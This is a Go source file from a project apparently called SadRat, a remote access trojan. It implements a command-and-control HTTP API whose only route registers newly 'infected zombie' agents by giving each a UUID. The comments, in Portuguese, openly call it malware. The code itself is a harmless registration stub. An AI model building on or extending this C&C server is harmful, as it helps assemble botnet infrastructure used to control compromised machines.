package presentation

import (
	"encoding/json"
	"net/http"

	"github.com/VitorDie/SadRat/internal/domain"
	"github.com/google/uuid"
)

// Repository define a interface que a Camada de Apresentação exige do cofre.
// Isso garante a inversão de dependência da Clean Architecture.
type Repository interface {
	SaveAgent(agent domain.AgentRow) error
}

// ServerHTTP é a nossa API C&C
type ServerHTTP struct {
	repo Repository
}

// NewServerHTTP constrói a API injetando o banco de dados
func NewServerHTTP(repo Repository) *ServerHTTP {
	return &ServerHTTP{repo: repo}
}

// Router configura todas as rotas do malware e retorna o roteador nativo do Go
func (s *ServerHTTP) Router() http.Handler {
	mux := http.NewServeMux()

	// Roteamento (Routing) usando o padrão nativo moderno do Go
	mux.HandleFunc("POST /api/agents", s.handleGiveAnUUIDForAgentRequest)

	return mux
}

// handleGiveAnUUIDForAgentRequest é a função chamada quando um novo zumbi é infectado
func (s *ServerHTTP) handleGiveAnUUIDForAgentRequest(w http.ResponseWriter, r *http.Request) {
	// 1. Regra de Negócio: O C&C gera uma identidade para o Agente recém-chegado
	newUUID := uuid.NewString()
	agentRow := domain.NewAgentRow(newUUID)

	// 2. Chamada à camada inferior (Repository/Service) para salvar no banco
	err := s.repo.SaveAgent(agentRow)
	if err != nil {
		http.Error(w, "Erro ao registrar agente", http.StatusInternalServerError)
		return
	}

	// 3. Codificação da Resposta (Encoding responses) para JSON
	response := map[string]string{"uuid": newUUID}
	
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(http.StatusCreated) // Retorna HTTP 201
	json.NewEncoder(w).Encode(response)
}
